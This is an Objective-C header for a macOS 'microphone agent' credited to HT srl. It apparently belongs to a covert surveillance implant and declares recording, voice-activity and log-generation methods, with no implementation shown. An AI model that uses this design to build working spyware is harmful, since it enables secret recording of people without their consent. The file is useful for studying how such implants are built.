/*
 * RCSMAgentMicrophone.h
 *  Microphone Agent for MacOS
 *  Uses AudioQueues from AudioToolbox
 *
 * Created by Alfredo 'revenge' Pesoli on 8/3/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import <Foundation/Foundation.h>
#import <AudioToolbox/AudioQueue.h>

#ifndef __RCSMAgentMicrophone_h__
#define __RCSMAgentMicrophone_h__

#import "RCSMCommon.h"


static const int kNumberBuffers = 3;

void myInputAudioCallback(void                               *inUserData,
                          AudioQueueRef                      inAQ,
                          AudioQueueBufferRef                inBuffer,
                          const AudioTimeStamp               *inStartTime,
                          UInt32                             inNumPackets,
                          const AudioStreamPacketDescription *inPacketDescs);

@interface RCSMAgentMicrophone : NSObject <Agents>
{
@private
  NSMutableDictionary         *mAgentConfiguration;
  BOOL                        mIsRunning;

@private
  AudioStreamBasicDescription mDataFormat;
  AudioQueueRef               mQueue;
  AudioQueueBufferRef         mBuffers[3];
  SInt64                      mCurrentPacket;
  uint32_t                    mIsVADActive;
  uint32_t                    mSilenceThreshold;
  
@private
  int32_t                     mLoTimestamp;
  int32_t                     mHiTimestamp;
  
@private
  int32_t                     mFileCounter;
  NSLock                      *mLockGeneric;

@private
  NSMutableData               *mAudioBuffer;
}

@property (readonly)          BOOL mIsRunning;
@property (readonly)          AudioStreamBasicDescription mDataFormat;
@property (readwrite, assign) AudioQueueRef mQueue;
@property (readwrite, assign) SInt64 mCurrentPacket;
@property (readonly)          uint32_t mIsVADActive;
@property (readonly)          uint32_t mSilenceThreshold;
@property (readonly)          NSLock *mLockGeneric;
@property (readwrite, assign) NSMutableData *mAudioBuffer;

+ (RCSMAgentMicrophone *)sharedInstance;
+ (id)allocWithZone: (NSZone *)aZone;
- (id)copyWithZone: (NSZone *)aZone;
- (id)retain;
- (unsigned)retainCount;
- (void)release;
- (id)autorelease;
- (id)init;

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
- (NSMutableDictionary *)mAgentConfiguration;

- (void)startRecord;
- (void)stopRecord;
- (void)setupAudioWithFormatID: (UInt32)formatID;

- (void)generateLog;

@end

#endif
